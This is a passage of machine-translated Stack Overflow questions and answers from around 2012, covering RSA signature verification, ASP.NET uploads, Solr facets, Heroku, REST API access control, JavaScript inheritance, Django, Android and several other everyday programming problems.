         sg.verify(parts(1).trim().getBytes())
    }
} 
```

我将客户端生成的 PEM 公钥转换为二进制公钥，以便 Java 可以读取：

```
openssl rsa -in src/com/example/security/key.pub -inform PEM -out src/com/example/security/key.der -outform DER -pubin 
```

在传输中，我用双新行分隔 XML 和签名。我意识到尾随空格可能会出现问题，所以我在上面添加了那些条带/修剪，然后检查日志并验证数据是否相同：

Python客户端：

```
2012-04-09 14:24:51,089: Data to sign: "<?xml version="1.0" ?><AgraData><package id="Local-Laptop" timestamp="1333945491074"><sensors><sensor id="SUMTEMP001" type="Temperature" units="C"><data>8</data></sensor><sensor id="SUMVOL001" type="Volume" units="l"><data>27</data></sensor><sensor id="SUMFLO001" type="FlowRate" units="l"><data>41.142</data></sensor></sensors></package></AgraData>" 
```

斯卡拉服务：

```
[2012-04-09 14:24:51,771] com.urbanalta.agrastore.security.SignatureSecurityManageer TRACE - Data "<?xml version="1.0" ?><AgraData><package id="Local-Laptop" timestamp="1333945491074"><sensors><sensor id="SUMTEMP001" type="Temperature" units="C"><data>8</data></sensor><sensor id="SUMVOL001" type="Volume" units="l"><data>27</data></sensor><sensor id="SUMFLO001" type="FlowRate" units="l"><data>41.142</data></sensor></sensors></package></AgraData>" 
```

但是在 Scala 服务中，当我尝试验证签名时它返回 false。我想在某个地方我没有指定正确的签名/密钥类型，但我不确定在哪里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T21:41:36.013

这可能是[此提交](https://stackoverflow.com/questions/521101/using-sha1-and-rsa-with-java-security-signature-vs-messagedigest-and-cipher)的另一个实例，其中不仅是摘要，还有算法标识符和摘要已签名。

# asp.net - 不支持给定路径的格式

> ID：10069867
> 
> 赞同：1
> 
> 时间：2012-04-09T06:44:39.693
> 
> 标签：asp.net, file-upload

从本地驱动器上传文件时出现以下错误。

> 不支持给定路径的格式。

给出了代码。请告诉我我必须做出哪些改变。

```
 string file0 = MapPathReverse(FileUpload1.PostedFile.FileName);// Get virtual path
    string conversationFileSource = Server.MapPath(file0);
    StreamReader file = new StreamReader(conversationFileSource); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:06:13.140

如果要访问上传文件的输入流：

```
using (StreamReader reader = new StreamReader(FileUpload1.PostedFile.InputStream))
{
    ...
} 
```

如果要将上传的文件保存在服务器上的某个文件夹中：

```
var uploadsFolder = Server.MapPath("~/uploads");
var file = Path.Combine(uploadsFolder, Path.GetFileName(FileUpload1.PostedFile.FileName));
FileUpload1.PostedFile.SaveAs(file); 
```

# solr - 在 solr 中获取构面计数 0

> ID：10069868
> 
> 赞同：5
> 
> 时间：2012-04-09T06:44:41.863
> 
> 标签：solr, faceted-search

我在我的应用程序中使用带有分面的 solr 搜索。我的用例是datadir中的索引文件不断变化。

问题是，当我基于特定领域进行分面时。我从以前在数据目录中的索引中获取值（并且当前不存在）。但是它们的返回值为 0。我不明白以前索引中的值在哪里保留并在全新的搜索期间返回？

虽然我可以简单地跳过计数为 0 的方面，但我知道这会严重影响我的可扩展性。任何不包括以前搜索者的方面的指针？

[编辑 1]：我正在使用的当前解决方法是`facet.mincount=1`在我的 URL 中添加一个。但是，我想这会影响我的表现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-12T16:50:23.657

我找不到评论选项，而且我没有足够的声誉来投票！我有同样的问题。我们在 solr 4.2 中使用原子更新。

我在这里找到了一些解释：http: [//collab.sakaiproject.org/pipermail/oae-dev/2011-November/000693.html](http://collab.sakaiproject.org/pipermail/oae-dev/2011-November/000693.html)

摘抄：

> 为了有效地处理多值字段（如标签）的方面，Solr 构建了一个“未倒排索引”（您认为它只会被称为“索引”，但我想这更令人困惑），它将内部文档 ID 映射到它们包含的术语列表。从这个数据结构计算方面只需要遍历结果集中的每个文档，在未倒排索引中查找它包含的术语，并将它们添加到所有文档的计数中。
> 
> 但是，这里有一个偷偷摸摸的优化，导致我们看到的计数为零。对于出现在超过 5% 文档中的术语，Solr 不会将它们包含在未倒排索引中（我猜，将它们排除在外有助于降低内存大小），而是使用常规获取这些术语的计数查询 Lucene 索引。由于“通用”术语集并不特定于您的结果集，并且由于任何给定的结果集不一定包含所有这些术语，因此您可以获得零计数。

它可能不是来自旧的索引值，而只是存在于超过 5% 的文档中的术语？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-02-07T07:00:09.807

我认为`facet.mincount=n`这不是一种解决方法，您应该使用它来仅获取非负方面计数。

```
solrQuery.setQuery("*:*");
solrQuery.addFacetField("foobar");
solrQuery.setFacetMinCount(1); 
```

# django - Heroku 和 Django 出现 405 错误

> ID：10069871
> 
> 赞同：8
> 
> 时间：2012-04-09T06:45:11.000
> 
> 标签：django, http, heroku, tastypie, http-status-code-405

我正在尝试将我的 django 项目从 apache 设置转移到 heroku。在这一点上，除了我在使用 PATCH Http 方法（我与 django-tastypie 结合使用）时遇到的问题外，一切似乎都运行良好。

我有一个允许这种方法的中间件，它可以在我以前的 apache 服务器上运行。现在我得到的只是 405 (METHOD_NOT_ALLOWED) 错误。常见的 HTTP 方法仍然有效（GET、POST、DELETE、POST）。我还读到 nginx 默认不支持 OPTIONS（可能还有 PATCH 请求？），并且必须进行一些配置。根据我的阅读，nginx 为 OPTIONS 方法请求返回了类似的 405 错误。我也很确定 heroku 使用的是 nginx 前端，所以这可能是问题所在。

这引出了我的下一个问题：我不知道如何向其中添加我自己的标题，因为这一切都由 heroku 控制。有谁知道确切的问题是什么？除了放弃 PATCH 方法（这使事情更方便）之外，还有什么方法可以让 PATCH 方法在 heroku 上工作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-12T16:56:34.113

Heroku 目前不支持补丁。这不是由于 nginx 问题，而是由于路由层中的问题。这是 Heroku 目前正在做的事情，但没有可用的 ETA。此外，您无法添加自定义标题，因为这些标题是为您控制的。

# security - 阻止 REST API 调用

> ID：10069872
> 
> 赞同：1
> 
> 时间：2012-04-09T06:45:11.087
> 
> 标签：security, authentication, rest

有没有办法阻止对非授权客户端的 REST API 调用？有没有办法让API“仅限于”（公开）少数定义明确的客户？

谢谢 ：-）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T13:04:21.733

您可以在客户端和服务器之间部署相互验证的 SSL。您可以在此处使用自签名证书，因此您无需从 CA 购买任何证书。这将确保您的服务器仅接受来自具有客户端证书的客户端的请求（将您的服务器配置为仅接受部署在客户端上用于客户端身份验证的自签名客户端证书）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T13:11:32.293

如果您使用的是 RESTFul HTTP

您可以将 HttpServletFilter 添加到您的 web.xml 中，以防止未经授权的客户端访问您的 REST 方法。

请参阅 [保护 JAX-RS 和 RESTeasy](http://docs.jboss.org/resteasy/2.0.0.GA/userguide/html/Securing_JAX-RS_and_RESTeasy.html)

如果您使用 Spring Framework，并且不想实现自己的 HttServletFilter，则可以使用[Spring Security](http://static.springsource.org/spring-security/site/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T13:23:17.267

您只需要在您的 RESTful 服务中实现安全机制，因此它拒绝访问未经授权的客户端（使用 404 或 401 响应代码）。有几种方法可以实现这一点：

*   中继 HTTP 身份验证机制，例如[基本身份验证](http://en.wikipedia.org/wiki/Basic_access_authentication)
*   实现自定义身份验证框架，克服 HTTP 基本身份验证限制。[Amazon](http://onjava.com/onjava/2007/11/07/introduction-to-amazon-s3-with-java-and-rest.html)有一种有趣的方法，包括自定义 HTTP 标头并支持散列。
*   使用现有的安全框架并将其功能添加到您的服务中。[Spring Security](http://java.dzone.com/articles/securing-restful-web-service)听起来是个不错的选择。

# html - Zimra - 我如何在 zimlets 中处理 HTML 表单？

> ID：10069873
> 
> 赞同：0
> 
> 时间：2012-04-09T06:45:12.683
> 
> 标签：html, ajax, forms, handle, zimbra

我尝试创建一个包含 HTML 表单的选项卡 Zimlet。我现在只想知道如何处理表单中的提交按钮，或者如何使用 ajax 工具包提交表单。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T09:58:59.220

让我有一个一般性的建议...

> 尝试根据 zimbra 标准做所有事情

您可以查看并下载示例以熟悉执行不同工作的默认方式...

回到您的问题，您的表格是如何制作的？它是普通的 html 表单还是由 javascript 动态创建的？

如果是 html，只需将提交表单的 onclick 设置为 zimlet 的函数，并在该函数中定义您想要执行的任何操作

```
 <input onClick="yourzimlet.prototype.OkFunction();" type="button" >

   yourzimlet.prototype.OkFunction= function(){
     //do somthing...
   } 
```

如果在 javascript 中，你有（至少）两种方式

1-使用正常的onclick

```
var formTag = document.createElement("form");
    //add form elements to formTag... 

var inputTag = document.createElement("input");
inputTag.type= 'button';
inputTag.setAttribute("value", "submit ... ");
inputTag.onclick = function() { yourzimlet.prototype.OkFunction();}
formTag.appendChild(inputTag);

   yourzimlet.prototype.OkFunction= function(){
     //do somthing...
   } 
```

2-使用 zimbra javascript API

与其使用普通的 onclick 表单，不如（取决于您的情况）使用 javascript 动态创建表单并添加 dwtButton 作为提交按钮

[http://files.zimbra.com/docs/zimlet/zcs/7.2.0/jsdocs/symbols/DwtButton.html](http://files.zimbra.com/docs/zimlet/zcs/7.2.0/jsdocs/symbols/DwtButton.html)

您可以为表单的提交按钮定义一个侦听器，然后在侦听器函数中执行您想做的任何事情

在所有情况下，您都可以通过 id 访问表单的元素及其值

# javascript - javascript继承模式比较

> ID：10069875
> 
> 赞同：4
> 
> 时间：2012-04-09T06:45:20.887
> 
> 标签：javascript, prototypal-inheritance

我已经阅读了一些关于 javascript 原型继承模式的教程，但我不确定以下两个中哪个是最佳实践。我注意到很多人都采用这种继承模式：

```
var A = function (){}
A.prototype = {} 

var B = function () {
    A.apply(this, arguments); // Calling the constructor of A
}
B.prototype = new A(); // Inherit from A through an instance 
```

或者，有一些来源执行以下模式：

```
var A = function (){}
A.prototype = {} 

var B = function () {
    A.apply(this, arguments); // Calling the constructor of A
}
for (var prop in A.prototype) {
    B.prototype[prop] = A.prototype[prop]; // Inherit from A by copying every property/methods from A
} 
```

虽然这两种模式都有效，但我很少看到人们使用后一种继承模式（即从父原型复制每个属性/方法） - 为什么？将属性/方法直接从父级复制到子级有什么问题吗？另外，这两种模式在某些方面是否存在本质上的不同？

谢谢你。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T07:25:01.187

这些模式非常不同，您可能已经猜到，第一个更好（但不是最好的）。让我们比较一下：

## 最现代、最好的模式

```
B.prototype = Object.create(A.prototype); 
```

这使用该[`Object.create`](http://es5.github.com/#x15.2.3.5)函数设置`B.prototype`为一个新对象，其内部`[[Prototype]]`为`A.prototype`. 这基本上正是您想要的：它会使实例在适当的时候`B`委托给它。`A.prototype`

## 原始模式

```
B.prototype = new A(); 
```

在 ES5 出现之前，这就是过去的做法`Object.create`。（尽管[有一些变通方法](http://javascript.crockford.com/prototypal.html)，即使它们没有被广泛使用。）这种方法的问题是任何仅实例的数据属性也最终会出现在 上`B.prototype`，这是不希望的。`A`此外，调用构造函数的任何副作用都会发生。本质上，这种方法混淆了两个相关但不同的概念：对象实例化和对象构造。

## 您帖子中的非标准模式

```
for (var prop in A.prototype) {
    B.prototype[prop] = A.prototype[prop];
} 
```

这种模式有几个问题：

*   它将从`A`原型链中的任何地方复制属性，一直到`Object`，直接复制到`B.prototype`. 这违背了原型继承的大部分目的，您应该在原型链上进行委托，而不是将其压缩为一个层次。
*   它只`A.prototype`从其原型链中获取可枚举的属性，因为`for ... in`跳过了不可枚举的属性。
*   它弄乱了定义在`A.prototype`（或其原型链）上的任何 getter 或 setter，只需复制它们的值而不是 getter/setter 函数。
*   对于任何试图阅读您的代码的人来说，这看起来很奇怪。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T08:34:18.480

这是使用工厂模式的另一种方法，没有原型：

```
/* parent */
function Animal(name, legs)
{
    /* members and methods declared within a new object */
    var obj =
    {
        name: name,
        legs: legs,
        description: function ()
        {
            return this.name + " is an animal";
        },
        printNumLegs: function ()
        {
            return this.name + " has " + this.legs + " legs";
        }
    }

    return obj;
}

/* subclass */
function Cat()
{
    /* apply parent arguments in the context of the current object */
    var obj = Animal.apply(this, arguments);

    /* public member */
    obj.furColor = "black";
    /* private member */
    var sleeping = false;
    /* private method */
    function printSleepingState()
    {
        /* can access public member ('name') without it being passed as constructor argument */
        return obj.name + " is " + (sleeping ? "sleeping" : "not sleeping");
    }

    /* declare a new method */
    obj.printFurColor = function ()
    {
        return obj.name + " has " + obj.furColor + " fur";
    }

    /* overloading */

    /* save parent method if needed */
    var oldDescription = obj.description;

    obj.description = function ()
    {
        return oldDescription.apply(obj) + " and " + printSleepingState();
    }

    return obj;
}

/* create object without new */
var kitty = Cat("Kitty", 4);
kitty.furColor = "yellow"; 
```

无论如何，没有“最好”的方法……这完全是口味问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T07:08:18.087

第一个变体看起来像一个常见的原型继承。它有一个小缺点，如果函数 A 需要一些必需的参数，则应在为函数 B 设置原型时传递它们。它还为原型创建父对象的实例。如果您不需要这种行为，则第二个变体看起来很有用。

顺便说一句：看一下[The third variant to make prototypal inheritance](https://stackoverflow.com/questions/2686258/javascript-inheritance-extend-function)。这有时也非常有用。

**编辑：**据我了解，第三个变体是 Domenic 解决方案的老式变体（适用于没有 Object.create 功能的旧浏览器）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-16T08:47:44.220

我意识到这个答案已经晚了，但我想我会为未来的读者添加评论。

我想补充一点，除了上述之外，还有其他选择。

继承的替代方法是混入。访问[http://javascriptweblog.wordpress.com/2011/05/31/a-fresh-look-at-javascript-mixins/](http://javascriptweblog.wordpress.com/2011/05/31/a-fresh-look-at-javascript-mixins/)

mix-ins 和方法 #2 之间有一些相似之处，但它们是不同的。在许多情况下，Mixins 可以比上面描述的继承技术灵活得多，因为它们允许一个对象从多个 mix-in 中混合（采取行为）。尽管 mix-ins 添加了行为，但它们通常不会向您的对象添加状态。

# java - 在 Hbase 中存储列表数据？

> ID：10069876
> 
> 赞同：1
> 
> 时间：2012-04-09T06:45:21.750
> 
> 标签：java, python, list, arraylist, hbase

我试图在 Hbase 中存储一个列表，数据对象的集合。例如，一个 User 表，其中 userId 是 Rowkey 和列系列 Contacts，其中列 Contacts:EmailIds 其中 EmailIds 是电子邮件列表，如

```
{abcd@example.com,bpqrs@gmail.com....etc} 
```

我们如何在 Hbase 中对此进行建模？我们如何在 Java 中做到这一点？/Python？我已经尝试在 Python 中酸洗和取消酸洗数据，但由于性能问题，这是我不想使用的一种解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T14:48:14.757

您可以通过以下方式使用它：

```
| 用户名 | 联系方式 |
| 测试 | c:email1=test@example.com; c:email2=te.st@example.com |

```

或者

```
| 用户名 | 联系方式 |
| 测试 | c:test@example.com=1; c:te.st@example.com=2 |

```

通过这种方式，您可以使用版本控制、添加/删除任意数量的电子邮件地址、使用过滤器，并且在客户端代码中迭代这些 KV 对非常容易

# actionscript-3 - 从 Flex 应用程序打开和读取 excel 文件的最佳方法是什么

> ID：10069877
> 
> 赞同：0
> 
> 时间：2012-04-09T06:45:22.447
> 
> 标签：actionscript-3, apache-flex, actionscript, flash-builder, flex4.5

从使用 Adob​​e Flash Builder 4.5 构建的 Flex 应用程序中打开、解析和生成 Excel 文件的最佳方法是什么。我做了很多研究，大部分都把我带到了外部库，如果这是最好的方法，我可以处理，但更喜欢内置方法。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:36:16.843

没有“内置方法”可以在 Flash 中读取 Excel 文件。如果您发现一些声称可以这样做的库，请给他们一个机会；你*真的*不想尝试自己做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:38:37.417

如果可以选择，将 Excel 文件导出为 .CSV 然后加载并解析它可能会更简单。这是一种更简单的文件格式，如果您的 Excel 工作表包含简单数据，它会更容易执行。

否则，rejo 提到的库（http://code.google.com/p/as3xls/）会有所帮助。Excel是一种复杂的文件格式，最好不要单独使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T08:21:50.873

试试这个库。 [http://code.google.com/p/as3xls/](http://code.google.com/p/as3xls/)

# php - 在 PHP 中为动态站点生成 Sitemap.xml 文件

> ID：10069879
> 
> 赞同：0
> 
> 时间：2012-04-09T06:45:38.457
> 
> 标签：php, dynamic, curl, sitemap

如何爬取站点的所有唯一链接并将 XML 文件制作/写入相应域的根目录。当我调用 mydomain.com/generatesitemap.php 时，我想要一些类似的东西，这个文件会抓取域中的所有链接并将它们写入文件 sitemap.xml。这在带有 cURL 的 PHP 中可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T09:22:32.577

这取决于您的网站。如果它是简单的站点——那么任务很简单。通过 curl 或 file_get_contents 获取您的站点根页面，preg_match 所有链接（参见此处，参考[http://www.mkyong.com/regular-expressions/how-to-extract-html-links-with-regular-expression /](http://www.mkyong.com/regular-expressions/how-to-extract-html-links-with-regular-expression/) )，然后递归抓取您网站内的所有链接，不要处理已处理的链接。

当 JavaScript 开始发挥作用时，任务变得更加复杂。如果导航使用 JavaScript 数据，则很难获得链接。可能还有其他导航技巧，例如选择组合框作为下拉菜单。

如果您有带有查询字符串的页面，任务可能会更加复杂。假设您有目录部分。和网址是这样的：

```
/catalogue
    /catalogue?section=books
    /catalogue?section=papers
    /catalogue?section=magazines 
```

是一页还是一页？

而这个呢？

```
 /feedback
 /feedback?mode=sent 
```

所以你应该照顾这种情况。

谷歌搜索中有很多这样的爬虫示例。例如看这个：

[http://phpcrawl.cuab.de/](http://phpcrawl.cuab.de/)

# python - 如何在带有选项（元组）的 ManyToManyField 中显示全名？

> ID：10069881
> 
> 赞同：0
> 
> 时间：2012-04-09T06:45:57.473
> 
> 标签：python, django, django-admin, django-templates, django-orm

我有一个像这样的简单模型

```
class UserType( models.Model ) :
    def __unicode__( self ) :
        return self.name

    TYPE_CHOICES = (
        ( 'ad', 'administrator'    ),
        ( 'mo', 'moderator'        ),
        ( 'vi', 'viewer'           ),
        ( 'pm', 'property manager' ),
        ( 'po', 'property owner'   ),
        ( 'vm', 'vendor manager'   ),
        ( 've', 'vendor'           ),
        ( 'te', 'tenant'           ),
    )

    name = models.CharField( max_length = 2, choices = TYPE_CHOICES ) 
```

在 中`admins.py`，我设置`filter_horizontal = ( 'user_types', )`了 for `UserProfile`，其中有一个`ManyToManyField`to `UserType`。但是在`UserProfile`管理页面中，M2M 的水平过滤器只显示元组的短名称：

![](../Images/b7c0f1c67b32f79eb07acc54e128b140.png)

同样在模板中，我想显示特定用户拥有的用户类型列表。所以我的模板代码看起来像这样

```
User type:
<ul>
    {% if user_object.profile.user_types.all %}
        {% for user_type in user_object.profile.user_types.all %}
            <li>{{ user_type|capfirst }}</li>
        {% endfor %}
    {% else %}
        <li>No user type</li>
    {% endif %}
</ul> 
```

在模板上，它只显示短名称。我知道通常我可以通过执行类似的操作来显示它的长名称`{{ get_user_type_display }}`，但在这种情况下，对于 M2M，它不起作用。

所以我的问题有两个：

1.  如何在管理页面中显示 M2M 选项/元组的长名称？
2.  如何在模板的 M2M 选择/元组中显示长名称？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T13:05:11.223

尝试以下操作：

```
class UserType( models.Model ) :
    TYPE_CHOICES = (
        ( 'ad', 'administrator'    ),
        ( 'mo', 'moderator'        ),
        ( 'vi', 'viewer'           ),
        ( 'pm', 'property manager' ),
        ( 'po', 'property owner'   ),
        ( 'vm', 'vendor manager'   ),
        ( 've', 'vendor'           ),
        ( 'te', 'tenant'           ),
        )
    STR_CHOICES = { key : value for (key,value) in TYPE_CHOICES }

    name = models.CharField( max_length = 2, choices = TYPE_CHOICES )

    def __str__(self):
        return self.STR_CHOICES[self.name] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-02-18T17:45:29.250

Astevanovic 的回答对我真的很有帮助。我想补充一点。

如果您在字段 manytomanyfield 中有一个模型...如果您已从模板中的该区域上传了所有其他模型...您将不再调用人类可读的名称`get_`选项`_display`。

`name`用which is the来调用它就足够了`return`。

所以现在只在模板中`{{usertype}}`

# iphone - 使用 ASIHTTPRequest 上传 txt 文件

> ID：10069889
> 
> 赞同：0
> 
> 时间：2012-04-09T06:46:52.653
> 
> 标签：iphone, objective-c, ios, asihttprequest

我在将数据文件上传到服务器时遇到问题。在 objective-c 方面，一切似乎都在工作（我启用了一个缓慢增加到 100% 的进度条）。这是代码（您可以假设uploadURL 是正确的URL，而outFilePath 是文件“out.txt”的正确路径，我已经仔细检查了这一点）：

```
ASIFormDataRequest *uploadRequest = [ASIFormDataRequest requestWithURL:uploadURL];
[uploadRequest setUploadProgressDelegate:uploadProgress];
[uploadRequest setFile:outFilePath forKey:@"file"];
[uploadRequest startSynchronous]; 
```

服务器似乎没有接收到数据文件。这是php代码（我没有写）：

```
<?php
if ($_FILES["file"]["error"] > 0)
{
echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
}
else
{
echo "Upload: " . $_FILES["file"]["name"] . "<br />";
echo "Type: " . $_FILES["file"]["type"] . "<br />";
echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";
move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]$
echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
}
?> 
```

任何关于我做错了什么的想法都将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:57:35.033

如果我运行此代码（取自 ASIHTTP 示例）

```
ASIFormDataRequest *request = [ASIFormDataRequest requestWithURL:[NSURL URLWithString:@"http://buildmac.ee.pitt.edu/~wsn/boinclite/upload_file"];

[request setPostValue:@"test" forKey:@"value1"];
[request setPostValue:@"test" forKey:@"value2"];
[request setPostValue:@"test" forKey:@"value3"];
[request setTimeOutSeconds:20];

//Create a 256KB file
NSData *data = [[[NSMutableData alloc] initWithLength:256*1024] autorelease];
NSString *path = [[NSHomeDirectory() stringByAppendingPathComponent:@"Documents"] stringByAppendingPathComponent:@"file"];
[data writeToFile:path atomically:NO];

[request setFile:path forKey:@"file"];

[request startAsynchronous]; 
```

结果我得到了这个（使用Charles Proxy监控上传）：

```
Upload: file
Type: application/octet-stream
Size: 256 Kb
Temp file: /private/var/tmp/phpi6UDp1
Stored in: upload/file 
```

所以一切都在正常运行。

# android - Android ExpandableListView 组位置始终为 0

> ID：10069892
> 
> 赞同：6
> 
> 时间：2012-04-09T06:47:26.350
> 
> 标签：android, expandablelistview

我有一个 ExpandableListView，我想在单击组时记录组位置。不幸的是，下面的代码总是返回 0，就好像我点击了第 0 组一样。

```
 exList.setOnGroupClickListener(new OnGroupClickListener() {

    @Override
    public boolean onGroupClick(ExpandableListView parent, View v, int groupPosition, long id) {
          groupPosition = ExpandableListView.getPackedPositionGroup(id);

          Log.i("group position", groupPosition + "");
          return false;
    }

  }); 
```

我在组和孩子上也有一个 longclicklistener 可以正常工作：

```
exList.setOnItemLongClickListener(new OnItemLongClickListener() {
      @Override
      public boolean onItemLongClick(AdapterView<?> parent, View view, int position, long id) {
          if (ExpandableListView.getPackedPositionType(id) == ExpandableListView.PACKED_POSITION_TYPE_CHILD) {
              groupPosition = ExpandableListView.getPackedPositionGroup(id);
...
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-04-01T13:30:29.720

确保你有这个布局

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical">

    <ExpandableListView
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

</LinearLayout> 
```

您不能将 ExpandableListView 放入 ScrollView。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-24T02:17:51.170

使用监听器 OnGroupExpandListener，方法 onGroupExpand 的参数是组在 ExpandableListView 的位置。

像那样：

```
listView = (ExpandableListView) findViewById(R.id.expandableListView);
listView.setOnGroupExpandListener(new OnGroupExpandListener() {
    @Override
    public void onGroupExpand(int groupPosition) {
        Log.d(TAG, "pos " + groupPosition);
    }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-12T05:41:41.563

您的可扩展列表视图可能位于滚动视图内。你不能有嵌套滚动。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-24T03:09:44.553

```
@Override
public Object getGroup(int groupPosition) {
    Log.i(TAG, "* getGroup : groupPosition =" + groupPosition);

    return categories[groupPosition];
} 
```

当你 extends `BaseExpandableListAdapter`，你会得到上面的覆盖方法。上面的 Log out put 清楚地显示了点击的组号。

在我的代码中，**类别**表示我作为组传递给可扩展列表的数据集。

您将有另一个覆盖方法调用；

```
@Override
public View getChildView(int groupPosition, int childPosition, boolean isLastChild, View convertView, ViewGroup parent) {
...
} 
```

使用该方法，您可以如下调用；

```
if(getGroup(groupPosition).toString().equals("GroupName")){
    //Do what even you like in for the clicked group
} 
```

这是一个工作代码，希望你能理解它。

# cakephp - Cakephp 2.1 - AjaxHelper

> ID：10069893
> 
> 赞同：0
> 
> 时间：2012-04-09T06:47:27.673
> 
> 标签：cakephp, cakephp-2.1, cakephp-ajaxhelper

我正在使用 cakePhp 的最新（2.1.1）版本。我试图实现 ajaxHlper( [http://www.cakephp.4uk.pl/](http://www.cakephp.4uk.pl/) ) 。但夹在中间。

```
 <head>
<script type="text/javascript">
     $(document).ready(function(){
            $("#EmployeeAddForm").validate();
     });            

</script>   
</head>

<div class="employees form">
<?php echo $this->Form->create('Employee');?>
<fieldset>
    <legend><?php echo __('Add Employee'); ?></legend>
<?php
    echo $this->Form->input('first_name');
    echo $this->Form->input('last_name');
    //echo $this->Form->input('age');
    echo $this->Form->input('age', array('class' => 'required number'));
    echo $this->Form->input('sex');
    echo $this->Form->input('Adress.first_line');
    echo $this->Form->input('Adress.second_line');
    echo $this->Form->input('Adress.city');
    echo $this->Form->input('Adress.state');
    echo $ajax->autoComplete('Department.name', '/ajax/autoComplete')
?>
</fieldset>
   <?php echo $this->Form->end(__('Submit'));?>
 </div>
   <div class="actions">
<h3><?php echo __('Actions'); ?></h3>
<ul>

    <li><?php echo $this->Html->link(__('List Employees'), array('action' => 'index'));?></li>
    <li><?php echo $this->Html->link(__('List Adresses'), array('controller' => 'adresses', 'action' => 'index')); ?> </li>
    <li><?php echo $this->Html->link(__('New Adress'), array('controller' => 'adresses', 'action' => 'add')); ?> </li>
</ul> 
```

这是我的 add.ctp 文件，其中 Department.name 我正在尝试使用 ajaxHelper 自动完成。

在我的EmployeesController.php中，我有自动完成功能，就像

```
 function autoComplete() {
    echo $this->params['url']['q'] . "---";
    $this->loadModel("Department");
    $this->set('departments', $this->Department->find('all', array(
        'conditions' => array(
            'Department.name LIKE ' => '%'.$this->params['url']['q'].'%'
        ),
        'limit' => $this->params['url']['limit'],
        'fields' => array('name')
    )));
    $this->layout = 'ajax';
} 
```

它不工作。我正在做的错误可能是什么？它给了我以下错误：

**注意（8）：未定义变量：ajax [APP\View\Employees\add.ctp，第 84 行] 致命错误：在 C:\xampplite\htdocs\cakephp\app 中对非对象调用成员函数 autoComplete()第 84 行的 \View\Employees\add.ctp**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T09:49:23.587

假设您已将助手添加到`$helpers`控制器的数组中，您必须使用`$this->Ajax->autoComplete()`而不是访问助手`$ajax->autoComplete()`。

# css - 我的网站在 Internet Explorer 中显示奇怪

> ID：10069896
> 
> 赞同：-5
> 
> 时间：2012-04-09T06:47:58.233
> 
> 标签：css, internet-explorer, cross-browser

我有这个网站：[http ://discovrd.com/](http://discovrd.com/)

如果您在 Chrome 或 Firefox 中查看该网站的导航栏，它会正确显示，但是当我在 IE 8 或其他 IE 浏览器中查看它时，它会完全搞砸一切。我不是 CSS 大师，所以我不知道如何解决这个问题。

请帮助我如何解决这个问题。您的帮助将不胜感激！

谢谢！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T07:01:07.320

不能确切地说，但对于初学者来说，你`ul`在保守链接之后随机打开了一个；IE8 中的 F12 工具显示菜单的`li`子项实际上不是。

验证您的标记和样式。在 IE 中使用 F12 工具进行调试。:)

# jasper-reports - 如何在碧玉报告中的段落后添加中断

> ID：10069897
> 
> 赞同：4
> 
> 时间：2012-04-09T06:48:00.497
> 
> 标签：jasper-reports

我想问一下。如何在**一个文本字段**中的段落后添加中断。例如，

报告是一种文字作品（通常是文字、演讲、电视或电影），其目的是传递信息。

**变成这样：-**

```
"A report is a textual work  line 1

(usually of writing, speech, television, or film) line 2

 made with the specific intention of line 3

 relaying information" line 4 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T08:06:08.400

您可以使用*`\n`*（换行符）符号，也可以使用标记语法。

样品：

```
<title>
    <band height="167" splitType="Stretch">
        <textField isStretchWithOverflow="true">
            <reportElement x="414" y="38" width="100" height="20"/>
            <textElement markup="styled"/>
            <textFieldExpression><![CDATA["A report is a textual work <br/>(usually of writing, speech, television, or film) <br/>made with the specific intention of <br/> relaying information"]]></textFieldExpression>
        </textField>
        <textField isStretchWithOverflow="true">
            <reportElement x="26" y="38" width="100" height="20"/>
            <textElement/>
            <textFieldExpression><![CDATA["A report is a textual work\n(usually of writing, speech, television, or film)\nmade with the specific intention of \nrelaying information"]]></textFieldExpression>
        </textField>
    </band>
</title> 
```

有关使用样式文本[的更多信息，请参见此处](http://jasperreports.sourceforge.net/sample.reference/styledtext/index.html#styledtext)。

# hadoop - Hadoop 设置超组不起作用

> ID：10069899
> 
> 赞同：0
> 
